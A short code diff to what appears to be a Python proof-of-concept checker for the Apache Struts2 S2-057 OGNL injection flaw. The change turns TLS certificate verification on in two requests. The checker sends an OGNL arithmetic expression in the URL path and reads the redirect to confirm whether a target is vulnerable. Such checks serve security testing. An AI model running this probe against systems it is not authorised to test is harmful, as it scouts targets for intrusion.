@@ -35,11 +35,11 @@ def poc(url, **kwargs):
     for urls in url_list:
         url = urls + '/${%s-%s}/%s' % (ran_a, ran_b, _path_list)
         try:
-            res = requests.get(url, timeout=timeout, headers=headers, allow_redirects=False, verify=False, )
+            res = requests.get(url, timeout=timeout, headers=headers, allow_redirects=False, verify=True)
             if res.status_code == 302 and res.headers.get('Location') is not None and str(ran_check) in res.headers.get(
                     'Location'):
                 urlLoca = res.headers.get('Location')
-                res2 = requests.get(domain + urlLoca, headers=headers, timeout=6, allow_redirects=False, verify=False)
+                res2 = requests.get(domain + urlLoca, headers=headers, timeout=6, allow_redirects=False, verify=True)
                 if str(ran_check) in res2.text:
                     result = "目标存在 Struts2-057, check url: %s" % url
                     return result
